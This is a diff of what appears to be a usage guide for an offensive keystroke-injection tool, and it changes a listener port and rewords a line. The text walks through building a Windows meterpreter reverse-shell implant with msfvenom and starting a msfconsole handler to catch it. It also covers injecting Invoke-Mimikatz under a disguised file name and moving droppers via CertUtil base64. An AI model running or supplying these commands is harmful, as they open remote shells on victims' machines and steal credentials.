@@ -287,10 +287,10 @@ $ rks -i Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
 To transfer droppers you can use `CertUtil.exe` base64 especially if it's large.
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=4444 -f exe -o implant.exe
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=8443 -f exe -o implant.exe
 ```
 
-For powershell.
+To transfer droppers with powershell via `CertUtil.exe` base64.
 
 ```
 $ rks -c "powershell.exe" -m dialogbox
@@ -309,7 +309,7 @@ $ rks -i implant.exe -o implant.exe -m cmdb64
 Activate your C2 listener and execute the implant.
 
 ```
-$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp set lhost <IP>; set lport 4444; exploit"
+$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp set lhost <IP>; set lport 8443; exploit"
 
 $ rks -c ".\implant.exe"
 ```
